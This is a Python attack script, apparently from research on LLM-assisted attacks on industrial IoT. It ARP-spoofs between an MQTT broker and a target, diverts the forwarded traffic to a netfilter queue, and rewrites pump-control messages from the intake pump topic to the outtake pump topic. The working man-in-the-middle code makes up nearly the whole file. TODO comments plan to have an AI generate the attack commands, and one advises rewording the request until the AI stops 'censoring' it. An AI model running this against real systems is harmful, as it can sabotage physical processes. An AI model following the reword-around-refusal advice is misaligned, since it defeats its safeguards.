import os
from urllib import response
import openai, threading
import json
import paho.mqtt.client as mqtt
from langchain.prompts import ChatPromptTemplate
from langchain_openai import ChatOpenAI
from scapy.all import *
import struct
import subprocess
import signal
import time
from netfilterqueue import NetfilterQueue
API_KEY = "Insert here"
openai.api_key = API_KEY
llm_model = "gpt-4"
targetIP = "192.168.8.145"
brokerIP = "192.168.8.210"
gatewayIP = "192.168.8.1"
message = ""
sniffed_topic = ""
sniffed_message = ""
desired_payload = None
stop_flag = False
rec = False

def on_connect(client, userdata, flags, rc):
    print("connected")    
def on_message(client, userdata, msg):
    
    global rec
    global message
    
    print("Received Message: ", str(msg.payload.decode("utf-8")))
    rec = True
    message = str(msg.payload.decode("utf-8"))
    #message += '"""'
    #print (message)
    #print (rec)
    #print (message)
def mqtt_payload_parser(payload):
    try:
        # Skip the fixed header (2 bytes minimum, could be more based on Remaining Length encoding)
        # and variable header starting with the topic length (2 bytes)
        topic_len = struct.unpack(">H", payload[2:4])[0]  # MQTT topic length is 2 bytes big-endian
        topic = payload[4:4+topic_len].decode()  # Extract topic
        message = payload[4+topic_len:].decode()  # Extract message
        return topic, message
    except Exception as e:
        return None, None   
                
'''
mqtt_message_modifier() - Modifies the current payload of the MQTT message filled with garbage. 
IMPORTANT: They must be of equal length due to TCP protocol.
'''
def mqtt_message_modifier(payload):
    try:
        # Skip the fixed header (2 bytes minimum, could be more based on Remaining Length encoding)
        # and variable header starting with the topic length (2 bytes)
        #print("Modifying payload")
        set_topic = "prim_chamber/outake_pump"
        #TODO:See if the AI can identify the topic_len, topic, and message variables below.
        topic_len = struct.unpack(">H", payload[2:4])[0]  # MQTT topic length is 2 bytes big-endian
        topic = payload[4:4+topic_len].decode()  # Extracts topic
        message = payload[4+topic_len:].decode() #Extracts message
        
        #print("\nOld Topic: " + topic + "\n")
        #print("\nOld Message: " + message + "\n")
        #TODO:See if the AI can craft this new payload on its own.
        new_payload = payload[:4] + set_topic.encode() + payload[4+topic_len:]
        #new_topic = new_payload[4:4+topic_len].decode()
        #new_message = new_payload[4+topic_len:].decode() #Extracts message
        #print("\nNew Topic: " + new_topic + "\n")
        #print("\nNew Message: " + new_message + "\n")
        return new_payload
    except Exception as e:
        print("\nPacket modification error occured")
        print(f"Error details: {e}")
        return None

'''
intercept_modify_forward() - Takes intercepted packet and determines if its a MQTT packet.
Then modifies the payload and send it.

'''
def intercept_modify_forward(pkt):
    global sniffed_topic, sniffed_message
    global targetIP, desired_payload
    packet = IP(pkt.get_payload())
    #TODO: Have AI determine if this is a TCP Packet.
    if packet.haslayer(TCP):
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        tcp_sport = packet[TCP].sport
        tcp_dport = packet[TCP].dport 
        ack_num = packet[TCP].seq + len(packet[TCP].payload)
        seq_num = packet[TCP].seq

        #TODO: Have AI determine if this is a MQTT packet and if the destination ip is of interest.
        if (tcp_sport == 1883 and ip_dst == targetIP):
            #print(f"Packet received: {pkt}")
            topic, message = mqtt_payload_parser(bytes(packet[TCP].payload))
            #TODO: Have AI determine if the topic related to the primary chamber's intake pump and if there is a message attached.
            if topic == "prim_chamber/intake_pump" and message:
                
                #Constructs and assigns new payload.
                new_payload = mqtt_message_modifier(bytes(packet[TCP].payload))
                packet[Raw].load = new_payload
                #Recalculates the checksum
                del packet[IP].chksum
                del packet[TCP].chksum
                #print(packet[IP].len)
                original_stdout = sys.stdout
                sys.stdout = open(os.devnull, 'w')
                #Reconstructs checksum values
                packet.show2()
                pkt.set_payload(bytes(packet))
                #Sends packet
                pkt.accept()
                sys.stdout = original_stdout
                
            else:
                pkt.accept()
        else:
            pkt.accept()
    else:
        pkt.accept()
'''
fake_data_transfer_attack() - Performs fake data transfer
'''
def fake_data_transfer_attack():
    global targetIP, client, desired_payload, stop_flag
    #Performs packet sniffing to discover topic and message:
    print("Performing Fake Data Transfer...")
    #print("Sniffing Packets...")
    #sniff(prn=process_packet, filter="tcp port 1883", store=False, timeout= 5)
    #print("Topic Found: " + sniffed_topic + "Message Found:" + sniffed_message)
    
    try:
        #Enables ip forwarding (hence passing on the packets we get)
        #TODO: Have AI generate this command
        os.system("sudo sysctl -w net.ipv4.ip_forward=1")
        #Reroutes the packets from the gateway router through this computer.
        #Reroutes packets from the MQTT server through this computer.
        #TODO: Have AI generate this command. You might have to reword this several times so that the AI doesn't censor it. But you must have this program run in parallel (hence is why I used a subprocess).
        nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", brokerIP, targetIP], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("ARP spoofing mqtt")
        time.sleep(3)
        #Enables nfqueue
        #TODO: Have AI generate this command.
        command = f"sudo iptables -A FORWARD -d {targetIP} -j NFQUEUE --queue-num 1"
        os.system(command)
        
        nfqueue = NetfilterQueue()
        nfqueue.bind(1, intercept_modify_forward)
        try:
            nfqueue.run()
        except Exception as e:
            print(f"An error occurred: {e}")
        print("Netfilter queue")
        # Set the callback function for intercepted packets
        while True:
            time.sleep(5)
            #client.publish(sniffed_topic, "Hacked")
            pass
    except KeyboardInterrupt:
        print("Stopping fake data")
        os.kill(nodeAttack.pid, signal.SIGTERM)
        #TODO: Have AI generate this command.
        command = f"sudo iptables -D FORWARD -d {targetIP} -j NFQUEUE --queue-num 1"
        os.system(command)
        # Clean up when the user interrupts the script
        nfqueue.unbind()

try:
    while True: 
        #lang_classification()
            #response = lang_classification()
            #json_string = '{"attack_class_fdt": true, "attack_class_dos": false, "attack_class_phsh": false}'
            #response = json.loads(json_string)
        fake_data_transfer_attack()
        #denial_of_service()
        break

except KeyboardInterrupt:
    print("Stopping Attack....")

